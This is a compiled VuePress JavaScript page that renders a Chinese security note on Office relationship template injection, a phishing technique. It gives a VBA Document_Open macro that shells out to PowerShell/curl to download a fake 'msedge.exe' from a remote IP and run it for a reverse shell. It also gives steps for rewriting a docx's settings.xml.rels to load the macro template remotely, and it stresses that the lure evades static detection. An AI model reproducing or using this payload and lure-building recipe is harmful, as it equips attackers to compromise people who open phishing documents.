import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r,o as p,c,a as e,d as n,b as o,e as a}from"./app-BT-bWAve.js";const l={},i=e("h1",{id:"office关系模板注入",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#office关系模板注入"},[e("span",null,"Office关系模板注入")])],-1),d={href:"https://cloud.tencent.com/developer/article/1917641",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.freebuf.com/articles/network/317116.html",target:"_blank",rel:"noopener noreferrer"},u={href:"https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.cisco.com/c/dam/m/zh_cn/products/security/talos/template-injection.pdf",target:"_blank",rel:"noopener noreferrer"},f=a(`<ul><li>测试环境: Win10+Office365</li></ul><p>利用Word文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，当目标用户点开攻击者发送的恶意Word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。</p><p>发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程DOTM文档中编写宏病毒或者木马即可。</p><p>制作一个宏钓鱼的文档挂载到 HTTP 服务器上, 例如前面的 VBA 宏调 Powershell 下载与执行文件达成反弹shell</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">Call</span> Shell<span class="token punctuation">(</span>Environ<span class="token operator">$</span><span class="token punctuation">(</span><span class="token string">&quot;COMSPEC&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token string">&quot; /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe &amp;&amp; msedge.exe&quot;</span><span class="token punctuation">,</span> vbNormalFocus<span class="token punctuation">)</span>

<span class="token keyword">End</span> <span class="token keyword">Sub</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>选定目标 word 文档后将其后缀名改成 <code>.zip</code> 并解压</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609857.png" alt="image-20240611053738672"></p><p>整体目录结构如下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609303.png" alt="image-20240611053804070"></p><p>制作关系模板注入文档主要需要修改两个文件</p><ul><li><p><code>\\word\\_rels\\settings.xml.rels</code></p><p>一般 <code>word/_rels</code> 文档里可能只有 <code>document.xml.rels</code> 没有 <code>settings.xml.rels</code>, 此时需要新建一个 <code>settings.xml.rels</code> 文档</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609832.png" alt="image-20240611054035175"></p><p>几个关键点</p><ul><li><p><code>Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot;</code></p><p>最后一定要是 <code>attachedTemplate</code> 定义关系模板</p></li><li><p><code>TargetMode</code> 要是 <code>External</code> 外部模板定义</p></li></ul></li><li><p><code>\\word\\settings.xml</code></p><p>在 <code>w:settings</code> 属性中定义外部模板</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609115.png" alt="image-20240611054105685"></p></li></ul><p>将目录重新打包成 zip 并重命名为 docx 文档</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609548.png" alt="image-20240611055158981"></p><p>到这里模板注入的钓鱼文档就制作好了, 但是由于这里外联模板直接填的ip是不受信任的, 因此这里即便打开了也不会正常加载外部模板, 需要添加受信任站点</p>`,14),g={href:"https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216",target:"_blank",rel:"noopener noreferrer"},E=a('<p>打开 <code>Internet选项-&gt;受信任的站点-&gt;站点</code> 添加目标主机即可</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111038830.png" alt="image-20240611103839273"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111039797.png" alt="image-20240611103954699"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111041875.png" alt="image-20240611104113796"></p><hr><p>打开该文档便会下载外部模板文档并执行宏代码达成反弹shell:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609052.png" alt="image-20240611060918908"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609182.png" alt="image-20240611060910931"></p><hr><h2 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h2>',10),_={href:"https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD",target:"_blank",rel:"noopener noreferrer"},b=e("hr",null,null,-1);function k(B,y){const t=r("ExternalLinkIcon");return p(),c("div",null,[i,e("blockquote",null,[e("p",null,[e("a",d,[n("干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)"),o(t)])]),e("p",null,[e("a",m,[n("wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户"),o(t)])]),e("p",null,[e("a",u,[n("已阻止有潜在危险的宏 - Microsoft 支持"),o(t)])]),e("p",null,[e("a",h,[n("利用模板注入攻击关键基础设施 (cisco.com)"),o(t)])])]),f,e("blockquote",null,[e("p",null,[e("a",g,[n("已阻止有潜在危险的宏 - Microsoft 支持"),o(t)])])]),E,e("ul",null,[e("li",null,[e("a",_,[n("常见钓鱼招式 - 先知社区 (aliyun.com)"),o(t)])])]),b])}const w=s(l,[["render",k],["__file","index.html.vue"]]),x=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/%E5%85%B3%E7%B3%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","title":"Office关系模板注入","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}],"git":{"createdTime":1717498304000,"updatedTime":1719565816000,"contributors":[{"name":"233","email":"ayusummer233@gmail.com","commits":4}]},"readingTime":{"minutes":2.14,"words":642},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/关系模板注入/index.md","localizedDate":"2024年6月4日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://cloud.tencent.com/developer/article/1917641\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>\\n<p><a href=\\"https://www.freebuf.com/articles/network/317116.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户</a></p>\\n<p><a href=\\"https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">已阻止有潜在危险的宏 - Microsoft 支持</a></p>\\n<p><a href=\\"https://www.cisco.com/c/dam/m/zh_cn/products/security/talos/template-injection.pdf\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">利用模板注入攻击关键基础设施 (cisco.com)</a></p>\\n</blockquote>"}');export{w as comp,x as data};
